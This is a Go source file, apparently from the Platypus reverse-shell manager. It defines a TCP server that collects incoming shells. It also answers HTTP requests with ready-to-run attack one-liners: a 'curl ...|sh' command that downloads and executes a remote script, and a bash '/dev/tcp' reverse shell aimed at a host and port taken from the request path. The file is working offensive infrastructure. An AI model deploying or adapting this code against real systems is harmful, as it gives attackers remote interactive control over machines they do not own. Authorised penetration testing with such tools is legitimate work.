package context

import (
	"bytes"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/lib/util/hash"
	"github.com/WangYihang/Platypus/lib/util/log"
	humanize "github.com/dustin/go-humanize"
)

type TCPServer struct {
	Host      string
	Port      int16
	Clients   map[string](*TCPClient)
	TimeStamp time.Time
}

func CreateTCPServer(host string, port int16) *TCPServer {
	return &TCPServer{
		Host:      host,
		Port:      port,
		Clients:   make(map[string](*TCPClient)),
		TimeStamp: time.Now(),
	}
}

func (s *TCPServer) Hash() string {
	return hash.MD5(fmt.Sprintf("%s:%d:%s", s.Host, s.Port, s.TimeStamp))
}

func (s *TCPServer) Run() {
	service := fmt.Sprintf("%s:%d", s.Host, s.Port)
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		log.Error("Resolve TCP address failed: %s", err)
		return
	}
	listener, err := net.ListenTCP("tcp", tcpAddr)
	if err != nil {
		log.Error("Listen failed: %s", err)
		return
	}
	log.Info(fmt.Sprintf("Server running at: %s", s.FullDesc()))

	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		client := CreateTCPClient(conn)
		log.Info("New client %s Connected", client.Desc())
		log.Info("Checking service")
		// Reverse shell as a service
		buffer := make([]byte, 4)
		client.Conn.SetReadDeadline(time.Now().Add(time.Second * 3))
		client.ReadLock.Lock()
		n, err := client.Conn.Read(buffer)
		client.ReadLock.Unlock()
		client.Conn.SetReadDeadline(time.Time{})
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				log.Error("Not requesting for service")
			} else {
				log.Error("Read from client failed")
				client.Interactive = false
				Ctx.DeleteTCPClient(client)
			}
		}
		log.Info("%d bytes read from client: %s", n, buffer[:n])
		if string(buffer[:n]) == "GET " {
			requestURI := client.ReadUntilClean(" ")
			log.Info("Request URI: %s", requestURI)
			var command string = fmt.Sprintf(
				"curl http://%s:%d/%s/%d|sh",
				s.Host,
				s.Port,
				s.Host,
				s.Port,
			)
			target := strings.Split(requestURI, "/")
			if strings.HasPrefix(requestURI, "/") && len(target) == 3 {
				host := target[1]
				port, err := strconv.Atoi(target[2])
				if err == nil {
					command = fmt.Sprintf("bash -c 'bash -i >/dev/tcp/%s/%d 0>&1'", host, port)
				} else {
					log.Debug("Invalid port number: %s", target[2])
				}
			} else {
				log.Debug("Invalid HTTP Request-Line: %s", buffer[:n])
			}
			client.Write([]byte("HTTP/1.0 200 OK\r\n"))
			client.Write([]byte(fmt.Sprintf("Content-Length: %d\r\n", len(command))))
			client.Write([]byte("\r\n"))
			client.Write([]byte(command))
			Ctx.DeleteTCPClient(client)

		} else {
			s.AddTCPClient(client)
		}
	}
}

func (s *TCPServer) OnelineDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"%s:%d (%d online clients)",
			s.Host,
			s.Port,
			len(s.Clients),
		),
	)
	return buffer.String()
}

func (s *TCPServer) FullDesc() string {
	var buffer bytes.Buffer
	buffer.WriteString(
		fmt.Sprintf(
			"[%s] %s:%d (%d online clients) (started at: %s)",
			s.Hash(),
			s.Host,
			s.Port,
			len(s.Clients),
			humanize.Time(s.TimeStamp),
		),
	)
	var descs []string
	for _, client := range s.Clients {
		descs = append(descs, fmt.Sprintf("\t%s", client.Desc()))
	}
	if len(descs) > 0 {
		buffer.WriteString("\n")
	}
	buffer.WriteString(strings.Join(descs, "\n"))
	return buffer.String()
}

func (s *TCPServer) Stop() {
	log.Info(fmt.Sprintf("Stopping server: %s", s.OnelineDesc()))
	for _, client := range s.Clients {
		s.DeleteTCPClient(client)
	}
}

func (s *TCPServer) AddTCPClient(client *TCPClient) {
	s.Clients[client.Hash] = client
}

func (s *TCPServer) DeleteTCPClient(client *TCPClient) {
	client.Close()
	delete(s.Clients, client.Hash)
}

func (s *TCPServer) GetAllTCPClients() map[string](*TCPClient) {
	return s.Clients
}
